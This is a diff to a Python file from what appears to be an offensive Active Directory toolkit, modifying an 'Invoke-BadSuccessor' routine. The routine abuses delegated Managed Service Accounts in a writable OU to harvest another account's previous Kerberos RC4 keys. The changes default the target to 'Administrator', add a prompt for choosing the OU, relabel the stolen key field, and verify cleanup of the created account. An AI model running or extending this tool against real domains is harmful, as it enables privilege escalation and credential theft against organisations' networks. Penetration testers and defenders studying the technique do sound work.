@@ -6167,10 +6167,12 @@ displayName=New Group Policy Object
 			dmsaname = get_random_name(service_account=True)
 		if not principalallowed:
 			principalallowed = self.conn.username
+		if not targetidentity:
+			logging.warning("[Invoke-BadSuccessor] No target identity provided. Using Administrator as default")
+			targetidentity = "Administrator"
 
-		# get writable ou
 		if not basedn:
-			logging.info(f"[Invoke-BadSuccessor] No basedn provided. Searching for writable OU in {self.root_dn}...")
+			logging.warning(f"[Invoke-BadSuccessor] No basedn provided. Searching for writable OU in {self.root_dn}...")
 			writable_ous = self.get_domainou(
 				properties = ['distinguishedName'],
 				writable=True,
@@ -6181,7 +6183,7 @@ displayName=New Group Policy Object
 				basedn = self.root_dn
 			elif len(writable_ous) > 1:
 				c_key = 0
-				logging.info('[Invoke-BadSuccessor] We have more than one writable OU. Please choose one that is reachable')
+				logging.warning('[Invoke-BadSuccessor] We have more than one writable OU. Please choose one that is reachable')
 				cnt = 0
 				for ou in writable_ous:
 					print(f"{cnt}: {ou['attributes']['distinguishedName']}")
@@ -6195,6 +6197,14 @@ displayName=New Group Policy Object
 						pass
 				basedn = writable_ous[c_key]['attributes']['distinguishedName']
 			else:
+				try:
+					confirm = input(f"[Invoke-BadSuccessor] Found writable OU: {writable_ous[0]['attributes']['distinguishedName']}. Use this OU? [Y/n]: ").strip().lower()
+					if confirm in ['n', 'no']:
+						logging.warning("[Invoke-BadSuccessor] Operation cancelled by user")
+						return
+				except KeyboardInterrupt:
+					logging.warning("[Invoke-BadSuccessor] Operation cancelled by user")
+					return
 				basedn = writable_ous[0]['attributes']['distinguishedName']
 
 		#add dmsa account
@@ -6230,13 +6240,12 @@ displayName=New Group Policy Object
 
 			for key in previous_keys:
 				try:
-					#print("{0}\\{1}:{2}".format(self.conn.domain, targetidentity, key[constants.EncryptionTypes.rc4_hmac]))
 					entries.append(
 						{
 							"attributes": {
 								"Domain": self.conn.domain,
 								"Identity": targetidentity,
-								"Key": key[constants.EncryptionTypes.rc4_hmac]
+								"RC4": key[constants.EncryptionTypes.rc4_hmac]
 							}
 						}
 					)
@@ -6253,7 +6262,10 @@ displayName=New Group Policy Object
 		# self.ldap_session.modify(dmsa_dn, {'msDS-ManagedAccountPrecededByLink': [(ldap3.MODIFY_REPLACE, ["CN=DC01,OU=Domain Controllers,DC=range,DC=local"])]})
 
 		# cleanup, remove dmsa account
-		self.remove_domaindmsa(identity=dmsaname, searchbase=basedn)
+		success = self.remove_domaindmsa(identity=dmsaname, searchbase=basedn)
+		if not success:
+			logging.error(f"[Invoke-BadSuccessor] Failed to remove DMSA account {dmsaname}")
+			return
 		return entries
 
 	def get_netterminalsession(self, identity=None, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
